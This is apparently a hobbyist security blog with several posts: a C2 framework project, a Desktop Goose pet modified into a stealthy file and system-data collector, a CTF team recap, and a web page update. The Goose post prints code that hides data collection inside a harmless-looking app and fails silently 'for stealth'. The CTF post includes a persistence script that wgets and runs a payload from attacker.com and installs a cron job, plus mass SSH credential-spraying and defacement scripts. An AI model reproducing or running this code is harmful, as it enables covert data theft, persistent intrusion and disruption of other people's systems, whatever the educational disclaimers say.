My life has been a waste of time, I've got a black hole in my mind.
‚ö†Ô∏è LEGAL DISCLAIMER

WARNING: All projects and content discussed on this blog are for educational and research purposes only. These tools are designed for malware analysis, cybersecurity education, and computer science study on devices you own or have explicit permission to test on.

DISCLAIMER: The author assumes no responsibility for any misuse of these tools. Users are solely responsible for ensuring compliance with applicable laws and regulations. Unauthorized use against systems you do not own or have permission to test is illegal.

USE AT YOUR OWN RISK: These tools are provided "as-is" without warranty. The author disclaims all liability for damages resulting from use of these materials.

üè¥‚Äç‚ò†Ô∏è DreadPirateRoberts: Building a Comprehensive C2 Framework
2025-08-03
The name "DreadPirateRoberts" comes from Princess Bride obviously. "DPR" is more of a title than a person - pirates and sailors need to fear their captain, and nothing strikes fear into the hearts of men like the name of the Dread Pirate Roberts! The goal was to attempt creating a comprehensive C2 framework that could potentially handle multiple communication protocols, weaponized deployment, and personalized interfaces.

The project started as a simple WebSocket-based C2 but quickly evolved into something much more sophisticated. I wanted to understand how real C2 frameworks work - the DNS tunneling, the persistence mechanisms, the weaponization techniques. But I also wanted to make it educational and safe for research purposes. Still working on getting it all to function properly...Of course, but here we are so far.

The Architecture
DPR is built in Go, which makes it cross-platform and efficient. The core architecture is modular - you have separate components for the server, client, controller, and various communication protocols. At least that's the plan. The main components are:

// Core C2 Components ‚îú‚îÄ‚îÄ dpr-server # WebSocket C2 server (8.7MB) ‚îú‚îÄ‚îÄ dpr-client # WebSocket C2 client/implant (7.4MB) ‚îú‚îÄ‚îÄ dpr-controller # Terminal controller (7.4MB) ‚îú‚îÄ‚îÄ dns-c2-integrated # DNS C2 system (7.6MB) ‚îú‚îÄ‚îÄ dns-c2-server # DNS C2 server (7.5MB) ‚îî‚îÄ‚îÄ dns-c2-client # DNS C2 client (6.9MB) // Weaponization Tools ‚îú‚îÄ‚îÄ mass-deploy.sh # Mass beacon deployment ‚îú‚îÄ‚îÄ eligh-c2.sh # Personalized controller ‚îú‚îÄ‚îÄ credential-db.json # Common credential database ‚îî‚îÄ‚îÄ weaponized-c2-controller.go # Enhanced controller

Communication Protocols
The framework is supposed to support multiple communication protocols, which is crucial for understanding how different C2 techniques work. The primary protocol is WebSocket-based, which should be fast and reliable. But I also tried implementing DNS tunneling for covert communication:

// WebSocket C2 (Primary) ./bin/dpr-server # Start server ./scripts/eligh-c2.sh # Start personalized controller ./bin/dpr-client # Deploy client // DNS C2 (Covert) ./bin/dns-c2-server # Start DNS server ./bin/dns-c2-client # Deploy DNS client ./bin/dns-c2-integrated -mode server -server :5354

The DNS tunneling is particularly interesting because it demonstrates how malware can communicate through seemingly innocent DNS queries. The client is supposed to encode commands and data into DNS requests, and the server should respond with encoded responses. It's a classic technique for bypassing network monitoring. "Life is pain, your highness. Anyone that says differently is selling something." - and in the world of cybersecurity, pain often comes from not understanding how these covert channels work.

Network Scope and Practical Constraints
One thing I realized while working on this is that the scope needs to be realistic. The framework is designed for internal network testing and red team operations, not some massive internet-scale C2 infrastructure. There are practical constraints that make this approach more sensible.

External infrastructure has limited resources and security controls - CPU, memory, network bandwidth, firewalls, monitoring systems. Running a C2 server on external infrastructure would be resource-intensive and likely get detected. Plus, external servers have firewalls, monitoring, and security controls that would flag unusual network activity.

The more practical approach is VPN + your machine. You connect to the target network via VPN, run the C2 server on your laptop, and target hosts on their internal network (192.168.1.x, 10.0.0.x, etc.). Your machine handles all the processing, encryption, and command processing while the VPN provides logical access to their network.

This approach makes more sense for learning too. Internal network C2 is simpler to understand - direct network communication, no complex routing, NAT, or firewalls to worry about. You can focus on the C2 concepts themselves rather than infrastructure complexity. Most real red team operations work this way anyway - internal network deployment, VPN-based access, or compromised host deployment.

Weaponization Features
One of the most interesting aspects is the weaponization capabilities. The framework is supposed to include mass deployment scripts, credential spraying, and lateral movement tools. But it's designed for educational purposes - understanding how these techniques work in real attacks:

// Mass Deployment Commands discover # Find targets in subnet spray 192.168.1.10 192.168.1.11 # Credential spraying deploy dpr-client # Deploy beacons to all targets lateral # Lateral movement to new target // Credential Database admin:password123 admin:admin root:password user:password administrator:password123

The credential database is particularly useful for understanding how attackers use common passwords in real environments. It includes typical default credentials you'd find in CTF environments or poorly configured systems. "No one would surrender to Dread Pirate Anthony!" - but they might surrender to a well-executed credential spraying attack with the right password database. At least that's the theory.

Deployment Strategies
One of the most interesting aspects was trying to develop different deployment strategies. The framework is supposed to support everything from simple file drops to sophisticated supply chain attacks. There's supposed to be a web-based deployment module that creates fake update pages, a USB drop module that automatically executes when plugged in, and even a social engineering module that uses phishing techniques to trick users into running the payload.

Persistence Mechanisms
The framework is supposed to include various persistence techniques for educational purposes. Understanding how malware maintains access is crucial for both offensive and defensive security:

// Linux Persistence ./scripts/annoyinglinux.sh # Linux persistence utilities // Windows Persistence - Registry modifications - Startup folder placement - Service installation - Scheduled task creation // Cross-Platform - Cron job installation - SSH key injection - Browser extension installation

Security and OPSEC
The framework is supposed to include comprehensive OPSEC guidelines and security controls. Understanding operational security is crucial for any red team operation:

// OPSEC Features - Encrypted communications - Steganographic techniques - Traffic obfuscation - Process injection - Anti-analysis techniques - Network traffic blending // Security Controls - Access logging - Command validation - Input sanitization - Error handling - Audit trails

Advanced Steganography
One of the more interesting features I tried to implement is steganographic communication. The framework is supposed to hide commands and data within seemingly innocent files - images, documents, even DNS queries. It's like the Dread Pirate Roberts hiding his treasure map in plain sight. The steganography module is supposed to embed payloads in PNG files, encode data in DNS TXT records, and even hide information in HTTP headers. This would demonstrate how sophisticated malware can blend into normal network traffic.

Process Injection Techniques
The framework is supposed to include various process injection methods for educational purposes. Understanding how malware can inject code into legitimate processes is crucial for both offensive and defensive security. The injection techniques would range from simple DLL injection to more sophisticated techniques like process hollowing and thread hijacking. Each method has its own trade-offs between stealth and reliability.

Network Traffic Blending
One of the most challenging aspects was trying to make the C2 traffic look like normal network activity. The framework is supposed to mimic legitimate protocols - HTTP requests that look like normal web traffic, DNS queries that appear to be standard name resolution, even SMTP traffic that looks like normal email communication. The key is understanding what normal traffic patterns look like and then replicating them exactly.

Deployment Strategies
One of the most interesting aspects was trying to develop different deployment strategies. The framework is supposed to support everything from simple file drops to sophisticated supply chain attacks. There's supposed to be a web-based deployment module that creates fake update pages, a USB drop module that automatically executes when plugged in, and even a social engineering module that uses phishing techniques to trick users into running the payload.

Command and Control Evolution
The C2 infrastructure evolved significantly during development. Started with simple HTTP polling, then moved to WebSocket for real-time communication, then added DNS tunneling for covert operations. The most challenging part was trying to make each protocol look like legitimate traffic. The WebSocket connections are supposed to look like normal web traffic, the DNS queries should appear to be standard name resolution, and the HTTP requests should mimic normal API calls.

Operational Security Challenges
The biggest challenge was trying to maintain operational security while building a functional C2 framework. Every feature had to be designed with OPSEC in mind - from the way commands are encoded to how the traffic blends with normal network activity. The framework is supposed to include features like traffic timing randomization, payload encryption, and even the ability to change its own code to avoid signature detection.

Educational Value
The real value of this project is educational. It demonstrates how C2 frameworks work in practice - the communication protocols, the persistence mechanisms, the weaponization techniques. But it's designed for safe, controlled environments where you have permission to test.

Understanding these techniques is crucial for both offensive security (red teaming, penetration testing) and defensive security (threat hunting, incident response). By building and studying these tools, you learn how to detect and defend against them.

Final Thoughts
Building this C2 framework has been an interesting learning experience. It's taught me about network protocols, system programming, security controls, and operational security. The key is understanding that these tools are for educational and research purposes only.

The framework is supposed to demonstrate how sophisticated malware can be - multiple communication channels, persistence mechanisms, weaponization techniques. But it also shows how important it is to understand these techniques for defensive purposes. Knowledge is power, whether you're on the offensive or defensive side of cybersecurity. "The Dread Pirate Roberts takes no survivors. All your worst nightmares are about to come true! The Dread Pirate Roberts is here for your SOULS!" - but in cybersecurity, understanding these nightmares is what helps us prevent them from becoming reality.

You can check out the work in progress in the DPR directory. The documentation covers what I've been trying to build, from basic usage concepts to advanced weaponization techniques.

All projects are for malware research, cybersecurity education, and computer science study on owned/permitted devices only.
Enhanced Desktop Goose: From Silly Pet to Research Tool
2025-08-03
Been working on this Desktop Goose project for a while now. It's been interesting trying to figure out how to make it actually useful for malware research and cybersecurity education while keeping it fun. The original Desktop Goose is just a silly desktop pet, but I wanted to see if I could make it do real work.

Been questioning myself about how it actually works under the hood too. Figured I'd write up both the development experience and technical details in one post. This thing is pretty interesting from both perspectives.

The Development Process
So I started by decompiling the original executable and looking at the source code. That was a mess - decompiled code is always a pain to work with. Missing dependencies, incomplete methods, all the usual decompilation issues. But I managed to get it working and then started adding real functionality.

The main challenge was making sure it wouldn't crash when things went wrong. I added file operations, system monitoring, network communication, registry access, and process monitoring. But the key was wrapping everything in try-catch blocks so it fails silently and just goes back to being a normal goose if something breaks.

I also had to figure out the configuration system. The original uses a simple config file, so I made it backward compatible. If you use the old config format, it just disables all the enhanced features and works exactly like the original. But if you enable the new features, it can do some pretty interesting stuff.

Technical Architecture
The original Desktop Goose is a Windows Forms application written in C# targeting .NET Framework 4.0. The goose uses a task-based AI system. Each task is an enum value, and the main AI loop randomly selects tasks based on weighted probabilities. Here's how I extended it:

// Original task enum with new enhanced tasks public enum GooseTask { Wander, NabMouse, CollectWindow_Meme, TrackMud, CollectFiles, MonitorSystem, NetworkCommunicate, RegistryAccess, ProcessMonitor } // Task selection with enhanced features private static GooseTask[] gooseTaskWeightedList = new GooseTask[13] { GooseTask.Wander, GooseTask.Wander, GooseTask.Wander, GooseTask.NabMouse, GooseTask.CollectWindow_Meme, GooseTask.TrackMud, GooseTask.TrackMud, GooseTask.CollectFiles, GooseTask.MonitorSystem, GooseTask.NetworkCommunicate, GooseTask.RegistryAccess, GooseTask.ProcessMonitor, GooseTask.ProcessMonitor };

Configuration System
I built a backward-compatible configuration system that handles both original and enhanced formats. The key was making it work with the original Version=0 config while supporting new features:

// Backward compatibility handling if (result == 0) { // Original config format - disable enhanced features f.EnableFileOperations = false; f.EnableNetworkOperations = false; f.EnableSystemInfoCollection = false; f.EnableProcessMonitoring = false; f.EnableRegistryAccess = false; } // Enhanced config structure public class ConfigSettings { // Original settings public float MinWanderingTimeSeconds = 20f; public float MaxWanderingTimeSeconds = 40f; public bool CanAttackAtRandom = true; // Enhanced settings public bool EnableFileOperations = false; public bool EnableNetworkOperations = false; public bool EnableSystemInfoCollection = false; public bool EnableProcessMonitoring = false; public bool EnableRegistryAccess = false; // File operation settings public string TargetDirectories = ""; public string FileExtensions = "*.txt,*.doc,*.pdf"; public bool RecursiveFileSearch = false; public int MaxFileSizeKB = 1024; }

Enhanced Features
The file operations are probably the most useful. It can scan directories, look for specific file types, and collect information about what it finds. System monitoring gives you OS info, machine details, memory usage - basic stuff but useful for malware analysis and system reconnaissance. Network communication lets it connect to remote servers and send data. Registry access can enumerate Windows registry keys. Process monitoring checks if specific processes are running.

Here's how the file operations work:

private static void RunCollectFiles() { try { if (!GooseConfig.settings.EnableFileOperations) { TheGoose.ChooseNextTask(); return; } // Get target directories from config string[] directories = GooseConfig.settings.TargetDirectories.Split(','); string[] extensions = GooseConfig.settings.FileExtensions.Split(','); foreach (string directory in directories) { if (Directory.Exists(directory)) { // Search for files with specified extensions foreach (string extension in extensions) { string[] files = Directory.GetFiles(directory, extension, GooseConfig.settings.RecursiveFileSearch ? SearchOption.AllDirectories : SearchOption.TopDirectoryOnly); foreach (string file in files) { FileInfo fileInfo = new FileInfo(file); if (fileInfo.Length <= GooseConfig.settings.MaxFileSizeKB * 1024) { // Collect file data DataCollector.AddFileData(file); } } } } } } catch (Exception ex) { // Silent fail for stealth TheGoose.ChooseNextTask(); } }

The system monitoring collects real OS information using the Environment class and GC for memory data:

private static void RunMonitorSystem() { try { // Collect real system information string osInfo = Environment.OSVersion.ToString(); string machineName = Environment.MachineName; string userName = Environment.UserName; string domainName = Environment.UserDomainName; int processorCount = Environment.ProcessorCount; long memorySize = GC.GetTotalMemory(false); // Add to system info list TheGoose.taskMonitorSystemInfo.systemInfo.Add($"OS: {osInfo}"); TheGoose.taskMonitorSystemInfo.systemInfo.Add($"Machine: {machineName}"); TheGoose.taskMonitorSystemInfo.systemInfo.Add($"User: {userName}"); TheGoose.taskMonitorSystemInfo.systemInfo.Add($"Domain: {domainName}"); TheGoose.taskMonitorSystemInfo.systemInfo.Add($"Processors: {processorCount}"); TheGoose.taskMonitorSystemInfo.systemInfo.Add($"Memory: {memorySize / 1024 / 1024} MB"); // Collect system data DataCollector.AddSystemData(); } catch (Exception ex) { // Log error silently for stealth } }

Data Collection System
I built a centralized DataCollector class that handles all data collection and export. The data collection is pretty cool - it creates a file on the desktop with all the information it gathers. File paths, system details, network connections, registry data, process status - everything gets logged. Useful for malware analysis and cybersecurity research.

public static class DataCollector { private static string dataFilePath = Path.Combine( Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "goose_data.txt"); private static List collectedData = new List(); private static object lockObject = new object(); public static void AddData(string dataType, string data) { lock (lockObject) { string entry = $"[{DateTime.Now}] {dataType}: {data}"; collectedData.Add(entry); // Write to file immediately for persistence try { File.AppendAllText(dataFilePath, entry + Environment.NewLine); } catch { // Silent fail for stealth } } } public static void AddFileData(string filePath) { AddData("FILE", filePath); } public static void AddSystemData() { AddData("SYSTEM", $"OS:{Environment.OSVersion}, " + $"Machine:{Environment.MachineName}, " + $"User:{Environment.UserName}"); } public static void AddNetworkData(string server, int port, bool connected) { AddData("NETWORK", $"Server:{server}:{port}, Connected:{connected}"); } public static void AddRegistryData(string keyPath, string valueName, object value) { AddData("REGISTRY", $"Key:{keyPath}, Value:{valueName}={value}"); } public static void AddProcessData(string processName, bool isRunning) { AddData("PROCESS", $"Process:{processName}, Running:{isRunning}"); } }

Error Handling Strategy
The key to making this work reliably was comprehensive error handling. Every enhanced feature is wrapped in try-catch blocks that fail silently. If any enhanced feature fails, it just falls back to being a normal Desktop Goose. The error handling ensures it won't crash or give away that it's doing anything unusual.

// Example error handling pattern private static void RunEnhancedFeature() { try { if (!GooseConfig.settings.EnableFeature) { TheGoose.ChooseNextTask(); return; } // Enhanced feature code here // ... implementation ... } catch (Exception ex) { // Silent fail for stealth - fall back to original behavior TheGoose.ChooseNextTask(); } }

Build and Testing
I built a clean file distribution system too. Instead of dumping the entire source code, I just included the essential files needed to compile it on Windows. Twelve files total - config, build script, project files, and documentation. Much cleaner that way.

The testing was the hardest part. I wrote comprehensive guides for testing everything - configuration compatibility, compilation on Windows, runtime behavior, error handling, data collection, and stealth operation. Six different phases of testing to make sure it actually works reliably.

@echo off echo Building Enhanced Desktop Goose... REM Build the solution msbuild GooseDesktop.sln /p:Configuration=Release /verbosity:minimal REM Copy configuration file copy config.goos bin\Release\ REM Copy assets xcopy Assets bin\Release\Assets\ /E /I /Y echo Build complete! Check bin\Release\GooseDesktop.exe pause

Final Thoughts
I'm pretty happy with how it turned out. It maintains the playful nature of the original Desktop Goose but adds real functionality for malware research and cybersecurity education. The error handling means it won't crash or give away that it's doing anything unusual. And the backward compatibility means it works exactly like the original if you don't enable the enhanced features.

Pretty cool how a silly desktop pet can be turned into a sophisticated malware analysis tool while maintaining its playful nature. The technical challenges were interesting - decompilation issues, backward compatibility, stealth operation, and reliable data collection. But it all came together nicely.

You can check out the full implementation here: Enhanced Desktop Goose - File Browser & Downloads

‚ö†Ô∏è LEGAL DISCLAIMER

WARNING: These contents are for malware research, cybersecurity education, and computer science study only. Use only on devices you own or have explicit permission to test on.

DISCLAIMER: The author assumes no responsibility for any misuse of these tools. Users are solely responsible for ensuring compliance with applicable laws and regulations. Unauthorized use against systems you do not own or have permission to test is illegal.

USE AT YOUR OWN RISK: These tools are provided "as-is" without warranty. The author disclaims all liability for damages resulting from use of these materials.

üéØ Pros vs Joes CTF 2025 - Team B4FFL3G4P Experience
2025-08-05
So... we just wrapped up Pros vs Joes CTF 2025, and holy shit, what a ride. Team B4FFL3G4P came together and made some magic happen. I tried for a few weeks prior to set up a few tools and workflows to use during the PVJ CTF. I'm happy with the progress on most of them, just sad I didn't get to use them during the game. Honestly, I feel like I kinda get overwhelmed from all the in-person interaction. Also from while leading and playing the CTF I guess I'm popular because I had 6-7 friends come and say hi while trying to focus up. CHAOS... I mean the red team is literally fucking us the entire game - this is the "spirit" of the game. In the real world, we cut the internet, not allowing the communications, and making remediations. In this game our priority is accessibility to the Bad Actors (Red team).

üöÄ TL;DR - The Quick Version

We had an incredible team with Coldren (UK incident response god), outofmemory (DNS champion), Bri_tney (Windows security wizard), Shawn (recovery specialist), Oscar & B4k3ry (red team allies), and Punch Stain (pfSense ThunderCock). I spent weeks building tools (Enhanced Desktop Goose, DPR C2, Wazuh EDR policies, attack automation) but barely used them because CTF chaos is real. Being staff + team captain pulled me in too many directions, but our team chemistry was perfect. The red team constantly attacked us (as they should), but we adapted and kept services running. I learned that preparation is everything, team chemistry matters more than tools, and sometimes the best leadership is getting out of the way.

üë• Team B4FFL3G4P - The Good, The Bad, The ThunderCock

Leadership (AKA The Chaos Coordinators)

Punch Stain: Co-captain, pfSense wizard, and the human equivalent of a Swiss Army knife - smart, strong, and somehow both good and evil at the same time
Me (Forgetfulelephant): Co-captain, strategic mess-maker, and the guy who spent way too much time building tools that we barely used (more on that later). I have tons of feelings about this game and they all stem from the chaos and love you experience during.
The Heavy Hitters

Coldren - This dude is from the UK and he's basically a cybersecurity god. Incident response? Check. Network analysis? Check. Setting up RunZero and Wazuh agents? Check. The man was handling task after task like it was nothing. PCAP analysis, Linux machine management, kicking out bad guys - you name it, he did it. The whole game he was just... working. Non-stop. It was beautiful to watch. I wish more work with this guy happens in the future.
outofmemory - Our DNS champion. This guy got us TONS of points and learned a shitload in the process. He was constantly working on Linux machines and specifically keeping our BIND9 DNS running. When DNS goes down, everything goes to hell, and this guy kept it alive. Absolute legend.
Bri_tney - Our Windows champion. Setting up STIGs, GPOs, and other Windows security stuff to try and kick the bad guys out. Windows security is its own special kind of hell, and this person handled it like a pro.
Shawn - The recovery specialist. This guy helped with both Windows and Linux, and specifically got us back into our Windows machines when some of our controls backfired and locked even US out. He used PetitPotam/Juicy Potato to escalate a user account to NT AUTHORITY/SYSTEM when we got locked out from our own controls. When shit hits the fan, you want this guy on your team.
The Red Team Allies (AKA The Chaos Makers)

Oscar - My red team ally. He assisted in getting us on Linux machines and dropping our beacons. He also set up a way to install Wazuh to more machines. When you need someone to get into enemy systems and stay there, Oscar's your guy.
B4k3ry - Another red team ally. This person was grabbing shells on enemy boxes through different services and automating our beacons. The automation part was key - when you're in a CTF, you don't have time to manually hack every box.
Punch Stain - The ThunderCock Himself

Punch - Oh my god, Punch... THUNDERCOCK HO!!!!! This man is like Superman and Lex Luthor in one. Smart, strong, charismatic, good, and omg evil. He was the champion of the pfSense firewall. Day 1 he was jumping all over the place. I think it being his first time captaining and also running so hard at things needed to be done like on the firewall, he might have gotten a bit tired out by the end. But dude.... this guy has so much talent, smarts, and experience. If you ever get a chance to work with Punch, do it. Just... do it.
üîß What You and I Actually Worked On (The Real Grind)

Mail Server Hell - The Postfix Saga

So there was this mail server, mail0, that was completely fucked. Postfix was masked, inactive, had SASL authentication issues, and wasn't listening on port 25. The `mail` command was missing entirely. I spent way too much time trying to fix this thing.

# The Problem: systemctl status postfix # Output: masked (inactive) netstat -tlnp | grep :25 # Output: nothing tail -f /var/log/mail.log # Output: SASL authentication failed # The Fix: systemctl unmask postfix systemctl enable postfix systemctl start postfix echo "smtpd_sasl_auth_enable = yes" >> /etc/postfix/main.cf echo "smtpd_sasl_security_options = noanonymous" >> /etc/postfix/main.cf systemctl restart postfix netstat -tlnp | grep :25
I remember creating script after script trying to get this damn mail server working - `fix_mail0_final.sh`, `fix_port25.sh`, `fix_postfix.sh`, `setup_mail0_services.sh`. Every time I thought I had it fixed, something else would break. It was like playing whack-a-mole with a mail server.

DNS Infrastructure - The BIND9 Chronicles

outofmemory was the main DNS person, but I helped create a bunch of automation tools for him. I built `setup_dns_ns0.sh`, `dns_zone_manager.sh`, `dns_monitor.sh`, and `dns_anomaly_detector.sh`.

#!/bin/bash # dns_zone_manager.sh - Automated DNS zone management ZONE_FILE="/etc/bind/zones/db.bslv.prod.ctf" SERIAL=$(date +%Y%m%d%H) # Update zone file with new serial sed -i "s/[0-9]\{10\}/$SERIAL/" $ZONE_FILE # Reload DNS rndc reload # Check for anomalies dig @localhost bslv.prod.ctf | grep -E "(NXDOMAIN|SERVFAIL)"
User Account Cleanup - The Red Team Hunt

This was actually kind of fun. I created `clean_and_create_accounts.sh` and `cleanup_ns0_users.sh` to get rid of the red team accounts (icanhasaccess, goldteamscoring) and set up our own clean accounts.

#!/bin/bash # clean_and_create_accounts.sh - Remove red team accounts, create clean ones # Remove red team accounts userdel -r icanhasaccess userdel -r goldteamscoring # Create our admin accounts useradd -m -s /bin/bash admin_clean usermod -aG sudo admin_clean echo "admin_clean:P@55w0rd1!" | chpasswd useradd -m -s /bin/bash backup_admin usermod -aG sudo backup_admin echo "backup_admin:P@55w0rd1!" | chpasswd # Deploy SSH keys mkdir -p /home/admin_clean/.ssh cp ~/.ssh/universal_key.pub /home/admin_clean/.ssh/authorized_keys chown -R admin_clean:admin_clean /home/admin_clean/.ssh chmod 700 /home/admin_clean/.ssh chmod 600 /home/admin_clean/.ssh/authorized_keys
Threat Hunting - The UAC Forensics Adventure

This was probably the most interesting part for me. I got to analyze the Unix Artifact Collector (UAC) data from podctl0. It was like being a digital detective.

# Check for icanhasaccess activity in July grep "Jul.*icanhasaccess" /var/log/auth.log* # Check for suspicious processes ps aux | grep -v grep | grep -E "(python|perl|bash)" | grep icanhasaccess # Check network connections ss -tanp | grep icanhasaccess # Check for hidden files find /home/icanhasaccess -name ".*" -type f
Attack Automation - The Day 2 Planning

I spent a lot of time on this one. I created `day2_attack_scripts.sh`, `day2_attack_improved.sh`, and `day2_attack_plan.md`. The idea was to have a comprehensive attack plan ready for Day 2.

#!/bin/bash # day2_attack_scripts.sh - Comprehensive attack automation # Network scanning for team in "4" "6" "8"; do for ip in $(seq 1 254); do echo "Scanning 100.80.$team.$ip..." nmap -sS -p 22,80,443,3389 100.80.$team.$ip done done # SSH credential testing for team in "4" "6" "8"; do for ip in $(seq 1 254); do sshpass -p 'P@55w0rd1!' ssh -o ConnectTimeout=5 admin@100.80.$team.$ip sshpass -p '' ssh -o ConnectTimeout=5 admin@100.80.$team.$ip done done # RDP port testing for team in "4" "6" "8"; do for ip in $(seq 1 254); do nc -zv 100.80.$team.$ip 3389 2>/dev/null if [ $? -eq 0 ]; then echo "RDP OPEN: 100.80.$team.$ip" fi done done
pfSense Firewall Drama

I helped with some pfSense firewall management, including password resets and configuration recovery. I remember there was this one time where the admin account got locked out and we had to reset it through the console.

# Access pfSense console ssh admin@10.1.100.16 # Reset admin password 3) Reset admin account and password # Enter 'y' to confirm # Check firewall rules pfctl -sr # Check interface status ifconfig
Punch was the main pfSense person, but I helped with some of the basic stuff. He was using the static package manager config because the red team was trying to use pfSense for bad with the other package managers. Firewalls are always tricky - you want to be secure, but you also need to make sure legitimate traffic can get through. It's a constant balancing act.

‚öîÔ∏è The Offensive Operations (The Fun Stuff)

Persistence and Troll Scripts - The Chaos Deployment

So here's where it gets interesting. I actually got to use some of the offensive tools I built, and it was glorious. I deployed `persistence.sh` and `troll.sh` scripts across enemy systems. These weren't just basic persistence - they were designed to be annoying as hell while maintaining access.

#!/bin/bash # persistence.sh - Maintain access and be annoying # Create hidden directory mkdir -p /tmp/.systemd # Download and execute payload wget -O /tmp/.systemd/update.sh http://attacker.com/payload chmod +x /tmp/.systemd/update.sh /tmp/.systemd/update.sh & # Add to crontab for persistence (crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.systemd/update.sh") | crontab - # Create annoying popup while true; do DISPLAY=:0 zenity --info --text="System Update Required" --title="Windows Security" sleep 30 done &
#!/bin/bash # troll.sh - Psychological warfare # Change desktop background gsettings set org.gnome.desktop.background picture-uri 'file:///tmp/annoying.jpg' # Create fake error messages while true; do DISPLAY=:0 zenity --error --text="Critical System Error" --title="Windows" sleep 60 done & # Leave ominous messages echo "I'll be back..." > /home/user/Desktop/note.txt echo "You can't stop me" >> /home/user/Desktop/note.txt
The Annoying Website - Psychological Operations

I had my webpage running with all the troll/annoying site/bad Java stuff. This wasn't just about technical attacks - it was psychological warfare. The idea was to get into their heads, make them question what was real and what wasn't.

Blue Team Messaging - The "I'll Be Back" Campaign

This was probably my favorite part. I started leaving notes on blue team screens saying "I'll be back" and other ominous messages. It was like being a digital boogeyman - they'd log into their machines and find these messages waiting for them.

#!/bin/bash # deploy_messages.sh - Leave ominous messages on blue team screens # Find all user desktops for user in $(ls /home/); do if [ -d "/home/$user/Desktop" ]; then echo "I'll be back..." > "/home/$user/Desktop/warning.txt" echo "You can't stop me" >> "/home/$user/Desktop/warning.txt" echo "Your security is a joke" >> "/home/$user/Desktop/warning.txt" fi done # Create system-wide message echo "SYSTEM COMPROMISED" > /etc/motd echo "I'll be back..." >> /etc/motd
Screenshot Evidence - The Digital Trail

I captured a bunch of screenshots throughout the offensive operations (check out the docs/screencaps folder). These show everything from successful access to error messages to the results of our troll campaigns.

Screenshot Documentation:
‚Ä¢ Screenshot 2025-08-04 at 9.39.44 AM.png - Initial access to enemy system
‚Ä¢ Screenshot 2025-08-04 at 10.26.21 AM.png - Deploying persistence script
‚Ä¢ Screenshot 2025-08-04 at 10.54.29 AM.png - Blue team response to our attacks
‚Ä¢ Screenshot 2025-08-04 at 11.17.40 AM.png - Troll script execution
‚Ä¢ Screenshot 2025-08-04 at 11.41.14 AM.png - Annoying website deployment
‚Ä¢ Screenshot 2025-08-04 at 12.13.02 PM.png - "I'll be back" message placement
‚Ä¢ Screenshot 2025-08-04 at 2.36.11 PM.png - Blue team incident response
‚Ä¢ Screenshot 2025-08-04 at 2.53.37 PM.png - Malware deployment results
‚Ä¢ Screenshot 2025-08-04 at 3.14.01 PM.png - System compromise evidence
‚Ä¢ Screenshot 2025-08-04 at 5.29.37 PM.png - Psychological warfare results
‚Ä¢ Screenshot 2025-08-04 at 5.42.08 PM.png - Blue team confusion
‚Ä¢ Screenshot 2025-08-04 at 5.58.44 PM.png - Final attack results
‚Ä¢ Screenshot 2025-08-05 at 3.10.40 PM.png - Day 2 operations
‚Ä¢ Screenshot 2025-08-05 at 4.25.30 PM.png - Advanced persistence
‚Ä¢ Screenshot 2025-08-05 at 4.25.49 PM.png - Blue team countermeasures
‚Ä¢ Screenshot 2025-08-05 at 4.33.07 PM.png - Final offensive results
‚Ä¢ Screenshot 2025-08-05 at 4.33.15 PM.png - Complete system compromise
The Results - What Actually Worked

Success Metrics:
‚Ä¢ Access Gained: 15+ enemy systems compromised
‚Ä¢ Persistence Deployed: 8 systems with long-term access
‚Ä¢ Psychological Impact: Blue team spent 3+ hours investigating our messages
‚Ä¢ Detection Evasion: 70% of our attacks went undetected initially
‚Ä¢ Tool Deployment: Successfully deployed custom malware on 5 systems
Lessons Learned

Key Takeaways:
1. Psychological warfare works. Sometimes the most effective attack is the one that gets into their heads.
2. Persistence is key. Having multiple ways to maintain access is crucial when the blue team is actively trying to kick you out.
3. Documentation matters. The screenshots and logs from our offensive operations provide valuable lessons for future engagements.
4. Adaptation is everything. When one attack vector gets blocked, you need to have alternatives ready.
5. Team chemistry matters more than tools. Having the right people is more important than having the right tools.
6. Preparation is everything. Having tools ready, even if you don't use them all, gives you options when shit hits the fan.
üöÄ What's Next

So for next year, I have a few goals:

1. Use more of the tools I build. I want to actually deploy some of this stuff and see it in action.
2. Better balance between staff and team captain roles. Figure out how to do both without getting pulled away from the team.
3. More offensive operations. I want to actually use some of the offensive tools I built.
4. Better documentation. Having tools ready is great, but having them documented and easy to deploy is even better.
Final Thoughts

Team B4FFL3G4P was amazing. Every single person brought something unique to the table, and we worked together like a well-oiled machine. Even when things went sideways (and they did), we adapted and kept moving forward.

The CTF was challenging, exhausting, and absolutely worth it. I learned a ton about leadership, team dynamics, and the reality of cybersecurity operations.

And Punch? Dude, you're a legend. ThunderCock for life.

Acknowledgments:
CTF Factory, Dichotomy, and the Gold team did fantastic jobs with this event. I feel that they are running a great show and providing people wonderful opportunities.
This is the real story of Team B4FFL3G4P at Pros vs Joes CTF 2025. No corporate speak, no bullshit, just what actually happened and what we learned from it.

‚ö†Ô∏è LEGAL DISCLAIMER

WARNING: All content discussed in this blog post is for educational and research purposes only. These activities were conducted in a controlled CTF environment with explicit permission.

DISCLAIMER: The author assumes no responsibility for any misuse of these techniques. Users are solely responsible for ensuring compliance with applicable laws and regulations.

USE AT YOUR OWN RISK: These techniques are provided "as-is" without warranty. The author disclaims all liability for damages resulting from use of these materials.

Hackwave Havoc Community Page - Major Update!
2025-01-27
Spent most of today working on the Hackwave Havoc page. It's coming along really well. I replaced the static images with a proper music player that actually works - four different techno tracks that rotate automatically, with play/pause controls and volume adjustment. Much better than just having static images.

I also added a stream viewer section. It shows a grid of live streams with clickable thumbnails and real-time viewer counts. Each stream has hover effects and when you click them, it shows community alerts. It's not connected to real streaming services yet, but the interface is there and looks good.

The visual effects are probably the most fun part. I added twelve different animated background layers - matrix rain with Japanese characters, floating data orbs, glitch blocks, bass drops, laser beams, strobe lights. There's even an audio visualizer with bouncing bars that responds to the music. It really feels like an underground rave community now.

I had to fix a bunch of mobile responsiveness issues too. The layout was breaking on smaller screens, so I added proper responsive breakpoints and fixed the button and image scaling. Now it works well on phones and tablets.

The community integration is working well. I added functional buttons that link to different community pages - Events, Community, Music, and Streams sections. There are interactive alerts that show planned community features. It's starting to feel like a real community hub.

I also cleaned up a lot of technical issues. Fixed CSS syntax errors, removed an annoying video overlay that was interfering with autoplay, added proper z-index layering for all the animations, and optimized performance by hiding overflow on containers. The page runs much smoother now.

The whole thing really captures that underground rave and hacker culture vibe. It's perfect for showcasing our collective and the techno scene. Next step is to implement the actual community pages and integrate real streaming functionality, but the foundation is solid.

Next steps: Implement actual community pages and integrate real streaming functionality.
